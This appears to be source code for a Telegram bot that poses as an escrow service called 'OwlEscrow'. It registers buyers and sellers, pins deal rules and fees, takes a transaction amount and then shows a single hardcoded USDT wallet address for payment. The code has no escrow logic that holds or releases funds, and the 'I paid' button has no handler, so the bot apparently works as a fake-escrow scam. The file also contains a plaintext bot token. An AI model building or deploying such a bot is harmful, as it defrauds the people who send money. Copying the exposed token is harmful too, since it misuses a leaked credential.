const { Telegraf, Markup } = require("telegraf");
const userData = {};
const bot = new Telegraf("8745731816:AAH2XL1u0f7x51MqE_EfFBwApoG7cJKLdro");


bot.on("new_chat_members", async (ctx) => {
    for (const member of ctx.message.new_chat_members) {

        if (member.is_bot) continue;

        await ctx.reply(
            `@${member.username || member.first_name}

Welcome to the OwlEscrow group.

Are you a buyer or a seller?`,
            Markup.inlineKeyboard([
                [
                    Markup.button.callback("Buyer", "buyer"),
                    Markup.button.callback("Seller", "seller")
                ]
            ])
        );
    }
});


bot.action("buyer", async (ctx) => {
  await ctx.editMessageText(
`✅ Buyer Registered

Role: BUYER

You may now continue the escrow process.`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback(
          "Continue Transaction",
          "continue_demo"
        )
      ]
    ])
  );
});

bot.action("seller", async (ctx) => {
  await ctx.editMessageText(
`✅ Seller Registered

Role: SELLER

You may now continue the escrow process.`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback(
          "Continue Transaction",
          "continue_demo"
        )
      ]
    ])
  );
});

bot.action("continue_demo", async (ctx) => {

const rulesMsg = await ctx.reply(
"⚪ Deal Rules ⚪\n\n" +

"🔶 1. Buyer send 100% payment to escrow\n" +

"🔶 2. Seller send details from account data to buyer in DM (direct message)\n" +

"🔶 3. Buyer get details, check and change it\n" +

"🔶 4. The buyer checks that there is no problem, and informs escrow to pay the seller\n" +

"🔶 5. The single escrow inspection time is within 24 hours\n" +

"🔶 6. Please operate strictly according to the prompts of the robot, if you do not understand, you can consult the manual customer service\n" +

"🔶 7. If there is no transaction within 24 hours after creating the group, the group will be automatically deleted. If you need to escrow again, please re-create the group. If the transaction is successful for more than 72 hours, the group will be automatically deleted, please keep the group chat data in advance.\n\n" +

"🔶 8. Each transaction requires a network fee, so the escrow fee is non-refundable.\n\n" +

"💰 Escrow fee:\n\n" +

"      Account deal: 2% total\n" +
"      (minimum fee 5$)\n\n" +

"⭕ NOTE: transaction fees will be deducted from payment.\n\n" +

"Tip: Before transferring money, make sure that the customer service ID is the administrator of the @OwlEscrow channel to avoid being cheated."
);

await ctx.telegram.pinChatMessage(
  ctx.chat.id,
  rulesMsg.message_id
);
await ctx.reply(
  "Do you agree with the rules?",
  Markup.inlineKeyboard([
    [
      Markup.button.callback(
        "✅ Accept Rules",
        "input_amount"
      )
    ]
  ])
);
});

// ==========================
// INPUT AMOUNT
// ==========================
bot.action("input_amount", async (ctx) => {
  await ctx.reply(
    "💰 Please type the transaction amount.\n\nExample:\n100"
  );
});

// ==========================
// SHOW PAYMENT INFO
// ==========================
bot.on("text", async (ctx) => {

  const amount = ctx.message.text;
userData[ctx.from.id] = {
  amount: amount
};
  if (isNaN(amount)) return;

  await ctx.reply(
`💰 Transaction Amount

${amount} USDT

Currency:
USDT

Status:
Waiting For Seller`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback(
          "✅ Confirm Amount",
          "yes_amount"
        )
      ]
    ])
  );

});

bot.action("yes_amount", async (ctx) => {
  await ctx.reply(
    "Click button below to get payment address.",
    Markup.inlineKeyboard([
      [
        Markup.button.callback(
          "Get payment address",
          "payment_address"
        )
      ]
    ])
  );
});

bot.action("payment_address", async (ctx) => {
  await ctx.replyWithPhoto(
    { source: "./1000070240.png" },
    {
      caption: `Please pay within 60 minutes

Amount : ${userData[ctx.from.id]?.amount || 0} USDT

TRC20 payment address:

TEJMgm44ANpkq2LZqPBXmg2an1Esk4eBWf`,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "I paid", callback_data: "paid" },
            { text: "Cancel Deal", callback_data: "cancel" }
          ]
        ]
      }
    }
  );
});

bot.action("complete", async (ctx) => {

  await ctx.reply(
    "✅ Demo Completed\n\nStatus:\nSUCCESS",
    Markup.inlineKeyboard([
      [
        Markup.button.callback(
          "New Demo",
          "rules"
        )
      ]
    ])
  );

});

bot.launch();

console.log("Bot Online");
